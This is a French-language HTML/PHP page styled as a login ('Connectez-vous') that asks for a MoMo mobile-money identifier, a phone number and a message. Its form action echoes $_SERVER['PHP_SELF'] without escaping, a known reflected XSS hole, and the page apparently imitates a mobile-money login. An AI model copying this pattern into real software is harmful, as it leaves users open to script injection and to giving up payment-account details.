<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connectez-vous</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-rbsA2VBKQhggwzxH7pPCaAqO46MgnOM80zW1RWuH61DGLwZJEdK2Kadq2F9CUG65" crossorigin="anonymous">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-kenU1KFdBIe4zVF0s0G1M5b4hcpxyD9F7jL+jjXkk+Q2h455rYXK/7HAuoJl+0I4" crossorigin="anonymous"></script>

    <style>

        * {
            margin: 0;
            padding: 0;
            font-family: Georgia, 'Times New Roman', Times, serif;
            box-sizing: border-box;
        }

        body {
            background: #ffb302;
            margin: 70px 0px;
        }

        .heading {
            text-align: center;
        }

        .heading h2 {
            font-size: 14px;
            font-weight: bold;
        }

        #login-form {
            background: #fff;
            margin: 0 auto;
            padding: 40px;
            width: 25rem;
            border-radius: 10px;
            font-size: 13px;
            font-weight: bold;
        }

        .comments {
            font-style: italic;
            font-size: 13px;
            color: #d82c2e;
            height: 25px;
        }

        .blue {
            color: #0069d6;
        }

        .form-control {
            height: 50px;
            font-size: 18px;
        }

        #login-form input[type=submit] {
            margin: 20px auto 0px;
            display: block;
        }

        .button1 {
            border: 1px solid #ddd;
            background: #ffa500;
            color: #000;
            width: 100%;
            font-weight: bold;
            text-transform: uppercase;
            padding: 18px;
            border-radius: 5px;
            transition: all 0.3s ease-in 0s;
        }

        .button1:hover {
            background: #fff;
            border-color: #050503;
        }

        .thank-you {
            text-align: center;
            margin-top: 15px;
            font-weight: bold;
            font-size: 14px;
        }


        

    </style>
</head>
<body>

    <div class="container">
        <div class="row">
            <form action="<?php echo $_SERVER['PHP_SELF']; ?>" id="login-form" method="post" role="form">
                <div class="heading"><h2>Connectez-vous a votre espace privé</h2></div>
                <div class="col-md-12">
                    <label for="name">Nom</label>
                    <input type="text" id="name" name="name" class="form-control" placeholder="Identifiant MoMo" value="">
                    <p class="comments">message d'erreurs</p>
                </div>
                <div class="col-md-12">
                    <label for="phone">Telephone<span class="blue"> * </span></label>
                    <input type="tel" name="phone" id="phone" class="form-control" placeholder="Votre Numero MoMo" value="">
                    <p class="comments">message d'erreurs</p>
                </div>
                <div class="col-md-12">
                    <label for="message">Message<span class="blue"> * </span></label>
                    <textarea id="message" name="message" class="form-control" placeholder="Votre message" rows="4"></textarea>
                    <p class="comments">message d'erreurs</p>
                </div>
                <div class="col-md-12">
                    <p class="blue">* <strong>ces informations sont réquises</strong></p>
                </div>
                <div class="col-md-12">
                    <input type="submit" class="button1" value="Se connecter">
                </div>

                <div class="thank-you">Merci ! Vous recevrez une notification</div>
            </form>
        </div>
    </div>

</body>
</html>